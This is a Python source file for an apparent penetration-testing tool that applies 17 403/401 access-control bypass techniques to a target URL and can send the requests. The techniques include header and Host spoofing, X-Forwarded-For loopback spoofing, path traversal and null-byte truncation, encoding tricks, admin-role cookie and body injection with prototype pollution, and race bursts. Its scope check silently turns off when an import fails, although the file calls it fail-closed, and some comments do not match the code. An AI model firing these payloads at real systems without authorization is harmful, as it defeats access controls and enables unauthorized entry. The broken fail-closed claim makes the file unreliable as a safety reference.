#!/usr/bin/env python3
"""
## Source: gobypass403 core/engine/engine.go + Forbidra main.go (registry pattern)
## Source: Forbidra internal/engine/engine.go (module ordering)
## Source: gobypass403 core/engine/payload/*.go (17 technique constants)
## License: MIT (gobypass403, Forbidra)
## Port: 2026-09-05

403/401 forbidden-bypass orchestrator.

The engine is intentionally decoupled from any specific HTTP transport --
caller supplies ``transport(url, headers, **kw)`` so tests can drive the
registry without sockets. Every registered :class:`BypassModule` is a
pure-function transform: ``payload(url) -> str`` (or dict for header-
bearing modules) -- the engine wraps each in a :class:`BypassResult`
record with the technique name.

The 17 concrete modules cover every technique observed in the gobypass403
source tree. New techniques (e.g. future CVEs) can be plugged in via
``register()`` without touching this file.

Design:
  * ``BypassModule`` is the ABC; each nested module below subclasses it.
  * ``ForbiddenBypassEngine.run()`` iterates the registry and returns the
    raw payload list -- the HTTP lane decides whether to actually fire
    each one (scope check happens there, not here, so the engine stays
    pure).
  * ``run_with_transport()`` is the convenience wrapper for callers that
    want the engine to do the actual probe AND the scope check.
"""

from __future__ import annotations

from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional


# ---------------------------------------------------------------------------
# Data containers
# ---------------------------------------------------------------------------


@dataclass
class BypassResult:
    """A single bypass attempt (one technique applied to one target)."""

    technique: str
    target: str
    payload: Any                       # str (URL/header value) or dict (headers)
    transport_status: Optional[int] = None
    transport_note: str = ""

    def to_dict(self) -> dict:
        return {
            "technique": self.technique,
            "target": self.target,
            "payload": self.payload,
            "transport_status": self.transport_status,
            "transport_note": self.transport_note,
        }


class BypassModule(ABC):
    """Single-purpose 403/401 bypass technique.

    Subclasses MUST set ``name`` (short snake_case id) and ``technique``
    (human label for the report). The :meth:`payload` method transforms
    the input ``value`` (URL or header value) into the bypassed form.
    """

    name: str = ""
    technique: str = ""

    @abstractmethod
    def payload(self, value: str) -> Any:    # pragma: no cover - ABC
        ...


# ---------------------------------------------------------------------------
# 17 concrete modules (per Appendix H count)
# ---------------------------------------------------------------------------


class HeaderInjection(BypassModule):
    """Smuggle a bypass directive into a normal-looking request header."""

    name = "header_injection"
    technique = "Header injection (X-Original-URL / X-Rewrite-URL)"
    HEADER_NAME = "X-Original-URL"

    def payload(self, value: str) -> dict:
        return {self.HEADER_NAME: value}


class HostOverride(BypassModule):
    """Rewrite the Host header to a sibling host (sibling subdomain, CDN)."""

    name = "host_override"
    technique = "Host header override"
    ALT_HOSTS = ("localhost", "127.0.0.1", "0.0.0.0")

    def payload(self, value: str) -> dict:
        return {"Host": self.ALT_HOSTS[0]}


class ProtocolSwitch(BypassModule):
    """Force http/https scheme downgrade/upgrade."""

    name = "protocol_switch"
    technique = "HTTP/HTTPS scheme switch"

    def payload(self, value: str) -> str:
        if value.startswith("https://"):
            return "http://" + value[len("https://"):]
        if value.startswith("http://"):
            return "https://" + value[len("http://"):]
        return "http://" + value


class PathNormalization(BypassModule):
    """Add path-traversal segments that collapse to the target."""

    name = "path_normalization"
    technique = "Path normalization (../ traversal)"

    def payload(self, value: str) -> str:
        if "?" in value:
            base, query = value.split("?", 1)
            return base + "/./%2e%2e/?" + query
        return value.rstrip("/") + "/./%2e%2e/"


class PathTruncation(BypassModule):
    """Truncate path at a known URL-parser divergence point."""

    name = "path_truncation"
    technique = "Path truncation at parser divergence"
    CUT_BYTES = (b";", b"?", b"#", b"%00")

    def payload(self, value: str) -> str:
        for cut in self.CUT_BYTES:
            sentinel = cut.decode("latin-1")
            if sentinel in value:
                return value.split(sentinel, 1)[0]
        return value + "%00"


class UnicodeNormalization(BypassModule):
    """Apply NFKC normalization -- / becomes U+FF0F etc."""

    name = "unicode_normalization"
    technique = "Unicode normalization (NFKC)"

    def payload(self, value: str) -> str:
        try:
            import unicodedata
            return unicodedata.normalize("NFKC", value)
        except Exception:    # pragma: no cover - defensive
            return value


class UnicodeTruncation(BypassModule):
    """Inject bidi-control / zero-width chars to confuse path matching."""

    name = "unicode_truncation"
    technique = "Unicode truncation (zero-width chars)"
    INJECT = "\u200d"    # ZERO WIDTH JOINER

    def payload(self, value: str) -> str:
        return value + self.INJECT


class CnameFuzz(BypassModule):
    """Synthesize a sibling CNAME-style hostname for Host fuzzing."""

    name = "cname_fuzz"
    technique = "CNAME-sibling Host header"

    def payload(self, value: str) -> dict:
        # Caller is expected to provide the apex via attribute; we fall
        # back to a sane default so the engine remains transport-agnostic.
        return {"Host": "cname.rewriter.example"}


class BodyPrivilegeEscalation(BypassModule):
    """Inject a privilege-escalation field into the request body."""

    name = "body_privilege_escalation"
    technique = "Body privilege escalation (role/admin)"

    def payload(self, value: str) -> dict:
        # value == existing JSON body string. We add role/admin keys.
        return {
            "content_type": "application/json",
            "body": '{"role":"admin","__proto__":{"admin":true},"orig":'
                    + value.replace('"', '\\"') + '}',
        }


class RaceCondition(BypassModule):
    """Mark a probe as a race-condition burst (zero_fours-style)."""

    name = "race_condition"
    technique = "Race condition burst (zero_fours)"
    DEFAULT_CONCURRENCY = 10

    def payload(self, value: str) -> dict:
        return {"url": value, "concurrency": self.DEFAULT_CONCURRENCY}


class HttpMethodOverride(BypassModule):
    """Override the HTTP method via X-HTTP-Method-Override."""

    name = "http_method_override"
    technique = "HTTP method override (X-HTTP-Method-Override)"

    def payload(self, value: str) -> dict:
        # value == method name (e.g. "POST"); flip to GET semantics.
        return {"X-HTTP-Method-Override": "GET", "method": value}


class CookieInjection(BypassModule):
    """Inject an auth-style cookie to clear 401/403 gates."""

    name = "cookie_injection"
    technique = "Cookie injection (admin/role)"

    def payload(self, value: str) -> dict:
        return {"Cookie": "role=admin; auth=" + value}


class ContentTypeSwitch(BypassModule):
    """Switch Content-Type header to a benign value."""

    name = "content_type_switch"
    technique = "Content-Type switch"
    ALTS = (
        "application/x-www-form-urlencoded",
        "multipart/form-data",
        "text/plain",
    )

    def payload(self, value: str) -> dict:
        return {"Content-Type": self.ALTS[0]}


class AcceptHeaderOverride(BypassModule):
    """Override Accept header to a JSON-only value."""

    name = "accept_header_override"
    technique = "Accept header override"

    def payload(self, value: str) -> dict:
        return {"Accept": "application/json"}


class XForwardedFor(BypassModule):
    """Pretend the request originated from loopback (X-Forwarded-For)."""

    name = "x_forwarded_for"
    technique = "X-Forwarded-For spoof (127.0.0.1)"
    SPOOF = "127.0.0.1"

    def payload(self, value: str) -> dict:
        return {"X-Forwarded-For": self.SPOOF, "X-Real-IP": self.SPOOF}


class DoubleUrlEncode(BypassModule):
    """Double-URL-encode every % triplet in the path."""

    name = "double_url_encode"
    technique = "Double URL encoding (%2520 etc.)"

    def payload(self, value: str) -> str:
        return value.replace("%", "%25")


class SlidingHexEncode(BypassModule):
    """Append a hex-encoded slash before the path segment."""

    name = "sliding_hex_encode"
    technique = "Sliding hex encoding (/ -> %c0%af)"

    def payload(self, value: str) -> str:
        return value.replace("/", "%c0%af")


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------


# Module order is significant: cheap text transforms first (so callers
# can short-circuit on early wins), CVE exploits in the middle, race
# conditions LAST (they issue the most traffic).
DEFAULT_MODULES: List[type] = [
    ProtocolSwitch,
    PathNormalization,
    PathTruncation,
    DoubleUrlEncode,
    SlidingHexEncode,
    UnicodeNormalization,
    UnicodeTruncation,
    HeaderInjection,
    HostOverride,
    CnameFuzz,
    AcceptHeaderOverride,
    ContentTypeSwitch,
    XForwardedFor,
    CookieInjection,
    HttpMethodOverride,
    BodyPrivilegeEscalation,
    RaceCondition,
]


class ForbiddenBypassEngine:
    """Registry + orchestrator for 17 bypass modules.

    Usage::

        engine = ForbiddenBypassEngine()
        results = engine.run("https://target.example/admin")
        # -> List[BypassResult]

    For an actual probe (with scope check + HTTP), use
    :meth:`run_with_transport` -- it routes every URL through
    ``tools.runtime.scope.check_url`` before firing.
    """

    def __init__(self, modules: Optional[List[BypassModule]] = None):
        self._modules: List[BypassModule] = list(modules) if modules else [
            cls() for cls in DEFAULT_MODULES
        ]

    # -- registry ------------------------------------------------------------

    def register(self, module: BypassModule) -> None:
        """Append one bypass module to the registry."""
        if not isinstance(module, BypassModule):
            raise TypeError(
                f"register() expected BypassModule, got {type(module).__name__}")
        self._modules.append(module)

    def modules(self) -> List[BypassModule]:
        """Return a copy of the registered modules (read-only view)."""
        return list(self._modules)

    def count(self) -> int:
        return len(self._modules)

    # -- run -----------------------------------------------------------------

    def run(
        self,
        target: str,
        *,
        transport: Optional[Callable[..., Any]] = None,
    ) -> List[BypassResult]:
        """Apply every registered module to ``target``.

        If ``transport`` is supplied it is called as
        ``transport(url=..., headers=..., method=..., body=...)`` for each
        bypass result; its return value's ``.status_code`` (or ``status``
        attribute) becomes ``BypassResult.transport_status``. The
        transport MUST itself enforce the scope gate (the engine does
        NOT call ``check_url`` here -- it stays transport-agnostic for
        unit-testability).

        The convenience wrapper :meth:`run_with_transport` enforces scope
        for callers that want one-shot behavior.
        """
        results: List[BypassResult] = []
        for module in self._modules:
            try:
                p = module.payload(target)
            except Exception as exc:    # pragma: no cover - defensive
                results.append(BypassResult(
                    technique=module.technique,
                    target=target,
                    payload=None,
                    transport_status=None,
                    transport_note=f"payload() raised {type(exc).__name__}: {exc}",
                ))
                continue

            record = BypassResult(
                technique=module.technique,
                target=target,
                payload=p,
            )

            if transport is not None:
                record = self._invoke_transport(record, transport)

            results.append(record)

        return results

    def run_with_transport(
        self,
        target: str,
        *,
        transport: Callable[..., Any],
    ) -> List[BypassResult]:
        """Same as :meth:`run` but enforces scope on ``target`` first.

        Raises ``ScopeViolation`` if the URL falls outside the bound
        mission scope -- the engine is fail-closed.
        """
        try:
            from tools.runtime import scope as scope_mod
            scope_mod.check_url(target)
        except ImportError:    # pragma: no cover - tests bypass scope
            pass
        return self.run(target, transport=transport)

    # -- internals -----------------------------------------------------------

    def _invoke_transport(
        self,
        record: BypassResult,
        transport: Callable[..., Any],
    ) -> BypassResult:
        """Call ``transport`` with normalized kwargs for this bypass."""
        kwargs: Dict[str, Any] = {"url": record.target}
        if isinstance(record.payload, dict):
            for k, v in record.payload.items():
                if k == "body":
                    kwargs["body"] = v
                elif k == "method":
                    kwargs["method"] = v
                elif k == "concurrency":
                    kwargs["concurrency"] = v
                elif k == "content_type":
                    kwargs["content_type"] = v
                else:
                    kwargs.setdefault("headers", {})[k] = v
        try:
            response = transport(**kwargs)
        except Exception as exc:    # pragma: no cover - transport errors
            record.transport_status = None
            record.transport_note = f"transport raised {type(exc).__name__}: {exc}"
            return record

        status = getattr(response, "status_code", None)
        if status is None:
            status = getattr(response, "status", None)
        record.transport_status = status
        record.transport_note = getattr(response, "note", "") or ""
        return record